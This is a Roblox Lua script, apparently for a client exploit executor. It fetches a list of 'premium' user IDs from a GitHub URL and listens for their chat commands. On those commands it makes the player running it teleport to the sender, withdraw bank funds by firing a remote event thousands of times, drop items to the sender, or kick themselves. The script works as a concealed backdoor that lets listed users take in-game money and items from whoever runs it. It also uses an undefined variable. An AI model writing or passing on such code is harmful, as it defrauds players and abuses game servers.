local ids = tostring(game:HttpGet("https://raw.githubusercontent.com/Turnergamer/ProX/refs/heads/main/src/id", true))
print(ids) -- prints 8328372 798327 937297

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer
local takeout = {
    [1] = "TakeBank",
    [2] = "One",
    [3] = ""
}

-- List of numbers in word format
local numbers = {
    "One", "Two", "Three", "Four", "Five", 
    "Six", "Seven", "Eight", "Nine", "Ten", 
    "Eleven", "Twelve", "Thirteen", "Fourteen", "Fifteen"
}
---args for commands
local dropargs = {
    [1] = "DropItem"
}

--- Target user IDs (List of Players who will be able to trigger the commands)
local TargetUserIds = {}
-- Convert the comma-separated IDs from the 'ids' variable into a table
for id in string.gmatch(ids, "%d+") do
    table.insert(TargetUserIds, tonumber(id))
end

-- Function to teleport to a player's position
local function teleportToPlayer(localPlayer, targetPlayer)
    -- Wait for HumanoidRootPart of both LocalPlayer and targetPlayer to load
    local targetHumanoidRootPart = targetPlayer.Character:WaitForChild("HumanoidRootPart", 5)  -- Wait for up to 5 seconds
    local localHumanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)  -- Wait for up to 5 seconds

    if localHumanoidRootPart and targetHumanoidRootPart then
        -- If both HumanoidRootParts are available, perform teleportation
        localHumanoidRootPart.CFrame = targetHumanoidRootPart.CFrame
    else
        warn("HumanoidRootPart not found for one of the players!")
    end
end

-- Function to store the current position of the player
local function getPlayerPosition(localPlayer)
    -- Wait for the HumanoidRootPart of LocalPlayer to load
    local humanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)  -- Wait for up to 5 seconds
    if humanoidRootPart then
        return humanoidRootPart.CFrame
    else
        warn("HumanoidRootPart not found for LocalPlayer!")
        return nil
    end
end

local function TakeOutAll()
    for _, number in ipairs(numbers) do
        takeout[2] = number  -- Update the second argument to the current number

        -- Fire the RemoteEvent 999 times for each number
        for i = 1, 999 do
            ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(takeout))
        end
    end
end

-- Command mapping table to easily add more commands
local commandActions = {
    ["^tp"] = function(sender)
        teleportToPlayer(LocalPlayer, sender)
    end,
    ["^giveall"] = function(sender)
        TakeOutAll()
        print("giveall triggered")
        teleportToPlayer(LocalPlayer, sender)
    end,
    ["^drop"] = function(sender)
        -- Store the current position of the LocalPlayer before dropping the item
        local originalPosition = getPlayerPosition(LocalPlayer)
        
        -- Drop item by firing the RemoteEvent
        teleportToPlayer(LocalPlayer, sender)
        wait(0.4)
        game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(dropargs))
        print("DROP triggered")
        wait(0.4)

        -- Teleport the player back to the original position after the drop
        if originalPosition then
            local humanoidRootPart = LocalPlayer.Character:WaitForChild("HumanoidRootPart", 5) -- Wait for it to load again if necessary
            if humanoidRootPart then
                humanoidRootPart.CFrame = originalPosition
                print("Returned to original position")
            else
                warn("HumanoidRootPart not found when returning!")
            end
        end
    end,
    ["^kick"] = function(sender)
        -- Kick the player with a custom message
        LocalPlayer:Kick("You have been kicked by a premium user.")
        print("KICK triggered")
    end
}

-- Monitor chat messages for commands
TextChatService.OnIncomingMessage = function(message)
    local sender = Players:GetPlayerByUserId(message.TextSource.UserId)

    if sender then
        -- Check if the sender's UserId is in the TargetUserIds list and the message matches a command
        for _, targetId in ipairs(TargetUserIds) do
            if sender.UserId == targetId then
                -- Loop through the commandActions table to check if the message matches a command
                for command, action in pairs(commandActions) do
                    if message.Text:lower() == command:lower() then
                        action(sender)  -- Execute the command's action function
                        break  -- Stop checking further commands once a match is found
                    end
                end
            end
        end
    end
end
